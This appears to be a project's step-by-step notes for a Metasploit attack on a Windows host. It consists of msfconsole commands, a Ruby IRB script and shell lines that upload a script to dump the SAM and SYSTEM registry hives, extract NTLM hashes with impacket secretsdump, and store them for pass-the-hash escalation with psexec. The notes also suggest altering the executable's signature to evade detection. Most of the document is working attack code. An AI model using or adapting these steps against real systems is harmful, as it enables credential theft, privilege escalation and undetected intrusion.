# Steps

``` sh
sudo msfconsole
# this is a contrived stand-in for some exploit that has already obtained a shell
use scanner/ssh/ssh_login
set USERNAME user
set PASSWORD ece
set RHOSTS 10.0.2.4
run # should connect. Use whatever method to get a shell that's suitable for you. Type 'sessions' to see your shell session
sessions -i 1
cmd
user@DESKTOP-02CPT0R C:\Users\user>irb
[*] Starting IRB shell...
[*] You are in the "self" (session) object
```

```
irb
n = 1 # for session 1
# Possible variation: maybe python isn't allowed to run over ssh, so you'd upload a zipped executable, such as one made by `py2exe` and then extract + run it.
framework.sessions[n].cmd_upload("/path/to/get_sam", "%userprofile%/Desktop/get_sam")
framework.sessions[n].shell_cmd("%userprofile%/Desktop/get_sam") # maybe tweak get_sam to print the hashes or export to a file we can download\
```

``` ruby
include Msf::Auxiliary::Report

# todo: make working_directory etc., options to the user via msfconsole
pathsep = '\\'
working_directory = "C:\\Users\\user\\get_sam_test"
local_get_sam_py = "/media/sf_share/hm_ms_exploit/get_sam.py"
remote_get_sam_py = working_directory + pathsep + "get_sam.py"
# todo: call + parse `where python` and `where python3` to find the available interpreters to invoke directly
get_sam_command = 'C:\\py\\python\\python.exe ' + remote_get_sam_py

# self.shell_command("cmd")
# self.shell_command("mkdir " + working_directory)
# self.shell_command("cd " + working_directory)
# File.open("sam.hive", 'w') { |file| file.write(sam_hive) }
# self.cmd_upload(local_get_sam_py, remote_get_sam_py)

output_lines = self.shell_command(get_sam_command).split()
# get_sam.py prints the hashes encoded as base64 to stdout. We are stdout and capture that into output_lines
# self.shell_command("rmdir /S /Q " + working_directory) # clean up after ourselves
sam_hive = Base64.decode64(output_lines[1][2..-2])
sys_hive = Base64.decode64(output_lines[2][2..-2])

sam_hive = Base64.decode64(output_lines[5][2..-2])
sys_hive = Base64.decode64(output_lines[6][2..-2])

# msf has a secretsdump.py script that's been modified so we can't use it directly. Save the hive files and call the default impacket secretsdump.py script to print the hashes. The output is saved into the dump var
File.open("sam.hive", 'w') { |file| file.write(sam_hive) }
File.open("sys.hive", 'w') { |file| file.write(sys_hive) }
dump = `python3 secretsdump.py -sam sam.hive -sys sys.hive local`
info_re = /(?<user>\w+):\d+:(?<ntlm_hash>\w+:\w+)/
for entry in dump.split() do
    m = entry.match(info_re)
    if m
        # We matched a user:ntlm_hash pair.
        # Capture the credential and save it in the metasploit database
        opts = {
            status: Metasploit::Model::Login::Status::UNTRIED,
            address: self.target_host,
            username: m[:user],
            private_data: m[:ntlm_hash],
            private_type: :ntlm_hash
        }
        data_service.create_credential(opts)
    end
end

# after the above captures the credentials into the database, check your msfdb for the username:ntlm hash pairs for the host you exploited and continue with your admin privileges.
# e.g.
# python3 psexec.py -hashes <ntlm_hash> user@ip_addr powershell.exe 
# metasploit could use an auxillary admin module to do this within the console as a new session
```

``` sh
# On Kali, for processing the hives
sudo apt install pip
sudo pip3 install impacket --upgrade
Installs to:
/usr/local/lib/python3.8/dist-packages/impacket/examples/secretsdump.py
# system and sam hives are needed for secretsdump.py
```

If your target doesn't have python installed, you can create an executable with access to a Windows machine:
```
C:\Users\user\Desktop\WPy64-3980\python-3.9.8.amd64\python.exe
> python.exe setup.py py2exe -b 0
```
**Note** you may also need to package VCRUNTIMExxx.dll. It's possible the setup.py script could be tweaked to borrow your system's VCRUNTIME DLL. Maybe setup.py could also inject noisy functions into get_sam.py prior to compilation to change the executable's signature and avoid detection.

Alternatively you could upload a python distribution, but that's massive.

## TODO:
1. retrieve target hashes
2. run dump_secrets on those hashes
3. run psexec exploit for privilege escalation